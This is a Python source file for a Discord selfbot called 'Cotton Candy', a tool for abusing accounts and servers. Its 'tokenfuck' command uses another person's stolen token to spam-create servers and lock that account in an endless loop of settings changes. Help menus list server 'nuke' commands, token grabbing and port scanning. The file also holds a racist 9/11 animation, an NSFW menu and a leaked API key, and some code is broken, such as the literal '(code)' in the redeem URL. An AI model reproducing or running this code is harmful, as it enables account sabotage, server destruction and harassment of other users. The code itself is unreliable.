#Made with love by xanax#1337
#copyright of water
import asyncio,datetime,functools,io,json,os,random,re,string,urllib.parse,urllib.request,time,base64,certifi
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import ctypes
import aiohttp
import colorama
import discord
import numpy
import requests
from colorama import Fore
from colorama import *
from colorama import init
from discord.ext import commands
from discord.utils import get

class SELFBOT():
    __version__ = 3

ctypes.windll.kernel32.SetConsoleTitleW("Cotton Candy Selfbot")

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

nitro_sniper = config.get('nitro_sniper')

stream_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


def startprint():
    if nitro_sniper:
        nitro = "Active"
    else:
        nitro = "Disabled"

    print(f'''{Fore.RESET}
                {Fore.LIGHTCYAN_EX}	
				 
                                  
                     {Fore.LIGHTCYAN_EX}  ___      _   _              {Fore.LIGHTMAGENTA_EX}    ___                _       
                     {Fore.LIGHTCYAN_EX} / __\___ | |_| |_ ___  _ __   {Fore.LIGHTMAGENTA_EX}  / __\__ _ _ __   __| |_   _ 
                     {Fore.LIGHTCYAN_EX}/ /  / _ \| __| __/ _ \| '_ \   {Fore.LIGHTMAGENTA_EX}/ /  / _` | '_ \ / _` | | | |
                    {Fore.LIGHTCYAN_EX}/ /__| (_) | |_| || (_) | | | | {Fore.LIGHTMAGENTA_EX}/ /__| (_| | | | | (_| | |_| |
                    {Fore.LIGHTCYAN_EX}\____/\___/ \__|\__\___/|_| |_| {Fore.LIGHTMAGENTA_EX}\____/\__,_|_| |_|\__,_|\__, |
                                                                            {Fore.LIGHTMAGENTA_EX}|___/ 
 

                         
                         
                                                 
{Fore.LIGHTMAGENTA_EX}-------------------------------------
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}Cotton Candy v{SELFBOT.__version__}                    {Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}Authors | {Fore.LIGHTCYAN_EX}Water#1337 & pep#4444    {Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTCYAN_EX}-----------------------------------{Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}Logged in as: {Fore.LIGHTCYAN_EX}{Candy.user.name}#{Candy.user.discriminator}           {Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}ID: {Fore.LIGHTCYAN_EX}{Candy.user.id}             {Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTCYAN_EX}-----------------------------------{Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}Nitro Redeemer | {Fore.LIGHTCYAN_EX}{nitro}            {Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}Guilds: {Fore.LIGHTCYAN_EX}{len(Candy.guilds)}                         {Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}Prefix: {Fore.LIGHTCYAN_EX}{Candy.command_prefix}                          {Fore.LIGHTMAGENTA_EX}|
{Fore.LIGHTMAGENTA_EX}|{Fore.LIGHTMAGENTA_EX}Instagram {Fore.LIGHTCYAN_EX}hola.calm                {Fore.LIGHTMAGENTA_EX}|
-------------------------------------
    ''' + Fore.RESET)


def Clear():
    os.system('cls')


Clear()


def Init():
    token = config.get('token')
    try:
        Candy.run(token, bot=False, reconnect=True)
        os.system(f'title (Candy Selfbot) - Version {SELFBOT.__version__}')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.BLUE}Invalid Information in config.txt has been passed" + Fore.RESET)
        os.system('pause >NUL')


class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()




def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))


colorama.init()
Candy = discord.Client()
Candy = commands.Bot(description='Candy Selfbot', command_prefix=prefix, self_bot=True)

Candy.antiraid = False
Candy.msgsniper = True
Candy.slotbot_sniper = False
Candy.giveaway_sniper = True
Candy.mee6 = False
Candy.mee6_channel = None
Candy.sniped_message_dict = {}
Candy.sniped_edited_message_dict = {}
Candy.whitelisted_users = {}
Candy.copycat = None
Candy.remove_command('help')


@Candy.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        await ctx.send('[ERROR]: You\'re missing permission to execute this command', delete_after=3)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"[ERROR]: Missing arguments: {error}", delete_after=3)
    elif isinstance(error, numpy.AxisError):
        await ctx.send('Invalid Image', delete_after=3)
    elif isinstance(error, discord.errors.Forbidden):
        await ctx.send(f"[ERROR]: 404 Forbidden Access: {error}", delete_after=3)
    elif "Cannot send an empty message" in error_str:
        await ctx.send('[ERROR]: Message contents cannot be null', delete_after=3)
    else:
        await ctx.send(f'[ERROR]: {error_str}', delete_after=3)


@Candy.event
async def on_message_edit(before, after):
    await Candy.process_commands(after)


@Candy.event
async def on_message(message):
    if Candy.copycat is not None and Candy.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.LIGHTMAGENTA_EX} - CHANNEL: {Fore.LIGHTCYAN_EX}[{message.channel}]"
            f"\n{Fore.LIGHTMAGENTA_EX} - SERVER: {Fore.LIGHTCYAN_EX}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.LIGHTMAGENTA_EX} - CHANNEL: {Fore.LIGHTCYAN_EX}[{message.channel}]"
            f"\n{Fore.LIGHTMAGENTA_EX} - SERVER: {Fore.LIGHTCYAN_EX}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.LIGHTMAGENTA_EX} - CHANNEL: {Fore.LIGHTCYAN_EX}[{message.channel}]"
            f"\n{Fore.LIGHTMAGENTA_EX} - SERVER: {Fore.LIGHTCYAN_EX}[{message.guild}]"
            f"\n{Fore.LIGHTMAGENTA_EX} - AUTHOR: {Fore.LIGHTCYAN_EX}[{message.author}]"
            f"\n{Fore.LIGHTMAGENTA_EX} - ELAPSED: {Fore.LIGHTCYAN_EX}[{elapsed}]"
            f"\n{Fore.LIGHTMAGENTA_EX} - CODE: {Fore.LIGHTCYAN_EX}{code}"
            + Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")
    if 'https://discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.datetime.now()
            code = re.search("https://discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/(code)/redeem',
                headers=headers,
            ).text

            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.LIGHTMAGENTA_EX}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.LIGHTMAGENTA_EX}[{time} - Nitro Success]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                      f"\n{Fore.LIGHTMAGENTA_EX}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if Candy.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.LIGHTMAGENTA_EX}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.LIGHTMAGENTA_EX}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if Candy.giveaway_sniper:
            if message.author.id == 294882584201003009:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.LIGHTMAGENTA_EX}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.LIGHTMAGENTA_EX}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Candy.user.id}>' in message.content:
        if Candy.giveaway_sniper:
            if message.author.id == 294882584201003009:
                print(""
                      f"\n{Fore.LIGHTMAGENTA_EX}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if 'Hey, Im pretty sure you want to see this Lootbox here.You all have **20 Seconds** to dispute it! Type ``pick`` for a chance to claim it!' in message.content:
        if Candy.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('Pick')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{LIGHTMAGENTA}[{time} - Lootbox Invalid" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{LIGHTMAGENTA}[{time} - Lootbox Rolled]" + Fore.RESET)
                SlotBotData()
        else:
            return


    await Candy.process_commands(message)


@Candy.event
async def on_connect():
    Clear()
    startprint()


@Candy.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(msgsniperlol).lower() == 'on':
        Candy.msgsniper = True
        await ctx.send('Candy msgsniper **enabled**', delete_after=2)
    elif str(msgsniperlol).lower() == 'false' or str(msgsniperlol).lower() == 'off':
        Candy.msgsniper = False
        await ctx.send('Candy msgsniper **disabled**', delete_after=2)

@Candy.command(aliases=["automee6"])
async def mee6(ctx, param=None):
    await ctx.message.delete()
    if param is None:
        await ctx.send("Please specify yes or no", delete_after=3)
        return
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
            await ctx.send("You can't bind Auto-MEE6 to a DM or GC", delete_after=3)
            return
        else:
            Candy.mee6 = True
            await ctx.send("Auto-MEE6 Successfully bound to `" + ctx.channel.name + "`", delete_after=3)
            Candy.mee6_channel = ctx.channel.id
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Candy.mee6 = False
        await ctx.send("Auto-MEE6 Successfully **disabled**", delete_after=3)
    while Candy.mee6 is True:
        sentences = ['Excitement replaced fear until the final moment.',
                     'The sun had set and so had his dreams.',
                     'People keep telling me "orange" but I still prefer "pink".',
                     'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
                     'I liked their first two albums but changed my mind after that charity gig.',
                     'Plans for this weekend include turning wine into water.',
                     'A kangaroo is really just a rabbit on steroids.',
                     'He played the game as if his life depended on it and the truth was that it did.',
                     'He\'s in a boy band which doesn\'t make much sense for a snake.',
                     'She let the balloon float up into the air with her hopes and dreams.',
                     'There was coal in his stocking and he was thrilled.',
                     'This made him feel like an old-style rootbeer float smells.',
                     'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
                     'The light in his life was actually a fire burning all around him.',
                     'Truth in advertising and dinosaurs with skateboards have much in common.',
                     'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
                     'The view from the lighthouse excited even the most seasoned traveler.',
                     'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
                     'It\'s difficult to understand the lengths he\'d go to remain short.',
                     'Nobody questions who built the pyramids in Mexico.',
                     'They ran around the corner to find that they had traveled back in time.',
                     'A half moon. A bright half and a dark half. Just like me.',
                     'Everything in this world is just a game and we are merely the pawns.',
                     'When You Die, Ill Be The One Writing Your Name In My Death Note.',
                     'In The End, There Is No Greater Motivation Than Revenge.',
                     'I Cant Develop Feelings. Thats How Most Idiots Screw Up.',
                     'Being alone is better than being with the wrong person.',
                     'I Wanted to be saved To.']
        await Candy.get_channel(Candy.mee6_channel).send(random.choice(sentences), delete_after=0.3)
        await asyncio.sleep(60)


@Candy.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Candy.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Candy.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Candy.slotbot_sniper = False


@Candy.command(aliases=['giveawaysniper'])
async def giveaway(ctx, param=None):
    await ctx.message.delete()
    Candy.giveaway_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Candy.giveaway_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Candy.giveaway_sniper = False


@Candy.event
async def on_message_edit(before, after):
    if before.author.id == Candy.user.id:
        return
    if Candy.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "**" + str(
                    discord.utils.escape_markdown(str(before.author))) + "**: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Candy.sniped_edited_message_dict) > 1000:
        Candy.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "**" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Candy.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        Candy.sniped_edited_message_dict.update({channel_id: message_content})

bot = commands.Bot(command_prefix=prefix)
bot.sniped_messages = {}
@Candy.event
async def on_message_delete(message):
    currentChannel = message.channel.id
    bot.sniped_messages[currentChannel] = (message.content, message.author, message.created_at)

@Candy.command()
async def snipe(ctx):
    currentChannel = ctx.channel.id


    contents, author, time = bot.sniped_messages[currentChannel]
    embed = discord.Embed(description=contents, color=discord.Color.purple(), timestamp=time)
    embed.set_author(name=f"Cotton Candy MsgSniper", url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    embed.set_thumbnail(url=Candy.user.avatar_url)
    embed.set_footer(text=f"Deleted In : #{currentChannel}")
    await ctx.channel.send(embed=embed)


@Candy.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Candy.sniped_edited_message_dict:
        await ctx.send(discord.Embed[currentChannel])
    else:
        await ctx.send("No message to snipe!")


@Candy.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Water#1337",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@Candy.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Candy.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


@Candy.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Candy Selfbot**", description="``|`` **General**\n``|`` **Account**\n``|`` **Text**\n``|`` **Image**\n``|`` **Nsfw**\n``|`` **Misc**\n``|`` **Nuke**\n``|`` **Spooky**\n",color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_author(name=ctx.author.display_name, url="https://discord.gg/rJcfQ6Hrvw", icon_url="https://cdn.discordapp.com/attachments/817581531086061628/818858304800555048/image0.gif")
    embed.set_thumbnail(url=Candy.user.avatar_url)
    embed.set_image(url='https://cdn.discordapp.com/attachments/813836413379805214/813848968353808424/nice_watermark.gif')
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)

# GENERAL
@Candy.command()
async def general(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**General Commands**", description="\n`> general` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> av <user>` - returns the user's pfp\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)
# Account
@Candy.command()
async def account(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Account Commands**", description="\n`> pfpsteal <user>` - steals the users pfp\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({Candy.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({Candy.giveaway_sniper})\n`> mee6 <on/off>` - auto sends messages in the specified channel ({Candy.mee6}) <#{Candy.mee6_channel}",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)
# TEXT
@Candy.command()
async def text(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Text Commands**", description="\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({Candy.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> chatclear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> 1337speak <message>` - talk like a hacker\n`> minesweeper` - play a game of minesweeper\n`> spam <amount>` - spams a message\n`> reverse <message>` - sends the message but in reverse-order\n`> shrug` - returns ¯\_(ツ)_/¯\n`> lenny` - returns ( ͡° ͜ʖ ͡°)\n`> unflip` - returns (╯°□°）╯︵ ┻━┻\n`> bold <message>` - bolds the message\n`> censor <message>` - censors the message\n`> underline <message>` - underlines the message\n`> italicize <message>` - italicizes the message\n`> strike <message>` - strikethroughs the message\n`> quote <message>` - quotes the message\n`> code <message>` - applies code formatting to the message\n`> purge <amount>` - purges the amount of messages\n`> empty` - sends an empty message\n`> firstmsg` - shows the first message in the channel history\n`> ascii <message>` - creates an ASCII art of your message\n`> ball <question>` - returns an 8ball answer\n`> slots` - play the slot machine\n`> abc` - cyles through the alphabet\n`>9/11` - sends a 9/11 attack\n`> massreact <emoji>` - mass reacts with the specified emoji",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)
#IMAGE              
@Candy.command()
async def images(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Image Commands**", description="\n`> distort <user>` makes users pfp distorted\n`> tweet <user> <message>` makes a fake tweet\n`> fry <user>` - deep-fry the specified user\n`> blurpify <user>` - blurpifies the specified user\n`> phcomment <user> <message>` - makes a fake PornHub comment\n",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)
# NSFW
@Candy.command()
async def nsfw(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Nsfw Commands**", description="\n`> anal` - returns anal pics\n`> hentai` - returns hentai pics\n`> boobs` - returns booby pics\n`> blowjob` - returns blowjob pics\n`> neko` - returns neko pics\n`> lesbian` - returns lesbian pics\n`> cumslut` - returns cumslut pics\n`> pussy` - returns pussy pics\n`> waifu` - returns waifu pics\n`> spank` - return spank pics\n`> solog` - returns solo girl pics\n`> femdom` - return femdom gifs\n",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)
# MISC
@Candy.command()
async def misc(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Misc Commands**", description="\n`> copycat <user>` - copies the users messages ({Candy.copycat})\n`> stopcopycat` - stops copycatting\n`> anticatfish <user>` - reverse google searches the user's pfp\n`>hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`>bots` - shows all bots in the server\n`> image <query>` - returns an image\n`>token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)
# NUKE
@Candy.command()
async def nuker(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Nuke Commands**", description="\n`>nuke` - nukes the server\n`> massban` - bans everyone in the server\n`> dynoban` - mass bans with dyno one message at a time\n`> masskick` - kicks everyone in the server\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> purgebans` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's nicknames to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> spamgcname` - spam changes the groupchat name\n`>",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)
# HARM
@Candy.command()
async def spooky(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="**Spooky Commands**", description="\n`> PScan` - Searches IP Ports\n`> Geoip` - Geo Information about IP\n`> pingweb <website-url>` pings a website to see if it's up\n`> ping` - returns the bot's latency\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`>gping <user>` Ghost pings user mentioned\n",  color=discord.Color(random.randint(0, 0xffffff)))
    embed.set_footer(text="Credits - Created By Water#1337 and rhvt#4444")
    await ctx.send(embed=embed)

'''@Candy.command(aliases=["giphy", "tenor", "searchgif"])
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])'''


@Candy.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
async def image(ctx, *, args):
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"Candy_anal.png"))
        except:
            await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
    else:
        await ctx.send("Nothing found for **" + args + "**")


@Candy.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if Candy.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(Candy.copycat))
    Candy.copycat = None


@Candy.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    Candy.copycat = user
    await ctx.send("Now copying " + str(Candy.copycat))


@Candy.command(aliases=["9/11", "911", "terrorist"])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
